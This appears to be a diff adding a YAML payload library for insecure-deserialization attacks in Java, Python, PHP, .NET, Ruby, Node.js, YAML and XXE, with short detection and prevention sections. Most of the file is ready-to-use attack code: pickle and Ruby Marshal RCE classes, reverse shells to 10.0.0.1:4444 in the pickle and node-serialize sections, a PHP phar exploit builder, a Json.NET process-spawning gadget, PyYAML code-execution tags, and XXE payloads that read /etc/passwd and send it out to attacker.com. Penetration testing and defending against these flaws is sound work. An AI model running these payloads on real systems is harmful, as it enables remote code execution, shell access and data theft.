@@ -1,0 +1,325 @@
+# Payloads - Deserialization Attacks
+# Insecure deserialization payloads for multiple languages
+
+payload_category: "deserialization"
+version: "1.0"
+description: "Deserialization attack payloads for Java, Python, PHP, .NET, Ruby, and Node.js"
+
+# Java Deserialization
+java_deserialization:
+  overview:
+    description: "Java object deserialization leading to RCE"
+    vulnerable_libraries:
+      - "Apache Commons Collections (3.1-3.2.1)"
+      - "Spring Framework"
+      - "Apache Commons BeanUtils"
+      - "Groovy"
+      - "Apache Commons FileUpload"
+  
+  ysoserial_gadgets:
+    commons_collections:
+      - "CommonsCollections1"
+      - "CommonsCollections2"
+      - "CommonsCollections3"
+      - "CommonsCollections4"
+      - "CommonsCollections5"
+      - "CommonsCollections6"
+      - "CommonsCollections7"
+    
+    spring:
+      - "Spring1"
+      - "Spring2"
+    
+    other:
+      - "Groovy1"
+      - "ROME"
+      - "JDK7u21"
+      - "Jython1"
+      - "BeanShell1"
+  
+  exploitation:
+    generate_payload: "java -jar ysoserial.jar CommonsCollections1 'calc.exe' | base64"
+    usage: "Send base64-encoded payload in serialized object field"
+  
+  detection:
+    magic_bytes: "ac ed 00 05" # Java serialization header
+    base64_prefix: "rO0AB" # Base64 of serialization header
+  
+  common_injection_points:
+    - "HTTP cookies (session data)"
+    - "JMX/RMI endpoints"
+    - "JMS messages"
+    - "JSON with type information (@class, @type)"
+
+# Python Pickle Deserialization
+python_pickle:
+  overview:
+    description: "Python pickle module allows arbitrary code execution"
+    vulnerable: "pickle.loads(), pickle.load()"
+  
+  basic_rce:
+    payload: |
+      import pickle
+      import os
+      
+      class RCE:
+          def __reduce__(self):
+              return (os.system, ('whoami',))
+      
+      pickle.dumps(RCE())
+  
+  reverse_shell:
+    payload: |
+      import pickle
+      import os
+      
+      class ReverseShell:
+          def __reduce__(self):
+              cmd = "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"
+              return (os.system, (cmd,))
+      
+      pickle.dumps(ReverseShell())
+  
+  detection:
+    magic_bytes: "80 03" # Pickle protocol 3
+    text_format: "(cosystem" # Readable in pickle data
+  
+  prevention:
+    - "Never unpickle untrusted data"
+    - "Use JSON or other safe serialization"
+    - "If pickle needed, use hmac signing"
+
+# PHP Object Injection
+php_unserialize:
+  overview:
+    description: "PHP unserialize() with magic methods exploitation"
+    magic_methods:
+      - "__wakeup() - Called on unserialize"
+      - "__destruct() - Called when object destroyed"
+      - "__toString() - Called when object treated as string"
+  
+  simple_rce:
+    payload: 'O:5:"Class":1:{s:4:"file";s:10:"/etc/passwd";}'
+    description: "Exploits __destruct reading file property"
+  
+  phar_deserialization:
+    payload: |
+      <?php
+      class Exploit {
+          public $cmd = "system('whoami');";
+      }
+      $phar = new Phar('shell.phar');
+      $phar->startBuffering();
+      $phar->setStub('<?php __HALT_COMPILER(); ?>');
+      $phar->setMetadata(new Exploit());
+      $phar->addFromString('test.txt', 'test');
+      $phar->stopBuffering();
+      ?>
+    
+    trigger: "file_exists('phar://shell.phar/test.txt')"
+    note: "Metadata unserialized automatically on phar operations"
+  
+  property_oriented_programming:
+    description: "Chain object properties to achieve RCE"
+    example: |
+      O:7:"Exploit":3:{
+        s:4:"file";O:8:"Logger":1:{s:8:"filepath";s:10:"/etc/passwd";}
+        s:7:"handler";O:6:"System":1:{s:3:"cmd";s:6:"whoami";}
+      }
+
+# .NET Deserialization
+dotnet_deserialization:
+  overview:
+    description: "Insecure BinaryFormatter, NetDataContractSerializer"
+    vulnerable_serializers:
+      - "BinaryFormatter"
+      - "NetDataContractSerializer"
+      - "LosFormatter"
+      - "ObjectStateFormatter"
+  
+  ysoserial_net:
+    usage: "ysoserial.exe -g ObjectDataProvider -f BinaryFormatter -c 'calc.exe'"
+    gadgets:
+      - "ObjectDataProvider"
+      - "PSObject"
+      - "TypeConfuseDelegate"
+      - "WindowsIdentity"
+  
+  viewstate_exploitation:
+    description: "ASP.NET ViewState deserialization"
+    detection: "__VIEWSTATE parameter in form"
+    exploitation: "Generate payload with ysoserial.net, replace ViewState"
+  
+  json_net_type_name:
+    vulnerable_config: "TypeNameHandling.All or TypeNameHandling.Objects"
+    payload: |
+      {
+        "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework",
+        "MethodName": "Start",
+        "MethodParameters": {
+          "$type": "System.Collections.ArrayList",
+          "$values": ["calc"]
+        },
+        "ObjectInstance": {
+          "$type": "System.Diagnostics.Process, System"
+        }
+      }
+
+# Ruby Marshal Deserialization
+ruby_marshal:
+  overview:
+    description: "Ruby Marshal.load() can execute arbitrary code"
+    vulnerable: "Marshal.load(user_input)"
+  
+  basic_exploit:
+    payload: |
+      # Generate malicious marshal data
+      class Exploit
+        def initialize(cmd)
+          @cmd = cmd
+        end
+        
+        def self._load(args)
+          system(args)
+        end
+      end
+      
+      Marshal.dump(Exploit.new('whoami'))
+  
+  detection:
+    magic_bytes: "04 08" # Marshal format version
+
+# Node.js Deserialization
+nodejs_deserialization:
+  overview:
+    description: "Node.js serialize-javascript, node-serialize vulnerable"
+    vulnerable_module: "node-serialize"
+  
+  rce_payload:
+    payload: |
+      {
+        "username": "_$$ND_FUNC$$_function(){require('child_process').exec('calc', function(error, stdout, stderr) { console.log(stdout) });}()"
+      }
+    
+    note: "IIFE (Immediately Invoked Function Expression) executes on deserialize"
+  
+  reverse_shell:
+    payload: |
+      {
+        "exploit": "_$$ND_FUNC$$_function(){var net = require('net'),cp = require('child_process'),sh = cp.spawn('/bin/sh',[]);var client = new net.Socket();client.connect(4444,'10.0.0.1',function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});return /a/;}()"
+      }
+
+# YAML Deserialization
+yaml_deserialization:
+  overview:
+    description: "PyYAML unsafe loader allows arbitrary code"
+    vulnerable: "yaml.load(data) without Loader=SafeLoader"
+  
+  python_yaml_rce:
+    payload: |
+      !!python/object/apply:os.system
+      args: ['whoami']
+    
+    alternative: |
+      !!python/object/new:os.system
+      args: ['calc']
+  
+  ruby_yaml_rce:
+    payload: |
+      --- !ruby/object:Gem::Installer
+      i: x
+      --- !ruby/object:Gem::SpecFetcher
+      i: y
+
+# XML External Entity (XXE) Deserialization
+xxe_deserialization:
+  basic_xxe:
+    payload: |
+      <?xml version="1.0"?>
+      <!DOCTYPE foo [
+      <!ENTITY xxe SYSTEM "file:///etc/passwd">
+      ]>
+      <root>&xxe;</root>
+  
+  blind_xxe:
+    payload: |
+      <!DOCTYPE foo [
+      <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
+      %xxe;
+      ]>
+    
+    evil_dtd: |
+      <!ENTITY % file SYSTEM "file:///etc/passwd">
+      <!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://attacker.com/?data=%file;'>">
+      %eval;
+      %exfiltrate;
+
+# Detection Techniques
+detection:
+  magic_bytes:
+    java: "ac ed 00 05"
+    pickle: "80 03"
+    marshal: "04 08"
+    .net: "00 01 00 00 00" # BinaryFormatter
+  
+  base64_patterns:
+    java: "rO0AB"  # ac ed 00 05 in base64
+    pickle: ["gAN", "gASV"]  # Alternative pickle patterns
+  
+  response_timing:
+    - "Inject sleep/timeout payload"
+    - "Measure response time"
+    - "Delayed response indicates deserialization"
+
+# Exploitation Chains
+exploitation_chains:
+  java_gadget_chain:
+    - "Find vulnerable library (Commons Collections)"
+    - "Generate payload with ysoserial"
+    - "Base64 encode serialized object"
+    - "Inject into cookie/POST parameter"
+  
+  python_pickle_chain:
+    - "Create class with __reduce__ method"
+    - "Return os.system with command"
+    - "Serialize with pickle.dumps()"
+    - "Send to application"
+  
+  php_phar_chain:
+    - "Create phar file with malicious metadata"
+    - "Upload phar file"
+    - "Trigger via file operation (file_exists, fopen, etc.)"
+    - "Metadata automatically unserialized"
+
+# Common Vulnerable Endpoints
+vulnerable_endpoints:
+  - "Session cookies (serialized session data)"
+  - "API endpoints accepting serialized objects"
+  - "File upload with object deserialization"
+  - "Message queues (RabbitMQ, Kafka)"
+  - "Cache systems (Redis, Memcached)"
+  - "JMX/RMI remote interfaces"
+
+prevention:
+  - "Never deserialize untrusted data"
+  - "Use safe serialization formats (JSON, Protocol Buffers)"
+  - "Whitelist allowed classes"
+  - "Enable integrity checks (HMAC signatures)"
+  - "Update vulnerable libraries"
+  - "Disable type information in JSON (TypeNameHandling.None)"
+  - "Use SafeLoader for YAML"
+  - "Input validation before deserialization"
+
+tools:
+  - "ysoserial: Java deserialization payloads"
+  - "ysoserial.net: .NET deserialization payloads"
+  - "SerialKiller: Java deserialization firewall"
+  - "Burp Collaborator: Out-of-band detection"
+  - "Java Deserialization Scanner (Burp extension)"
+
+references:
+  - "OWASP Top 10:2025 A08 (Software and Data Integrity Failures)"
+  - "CWE-502: Deserialization of Untrusted Data"
+  - "Java Unmarshaller Security"
+  - "ysoserial: Proof-of-concept tool"
+  - "Attacking .NET Deserialization"
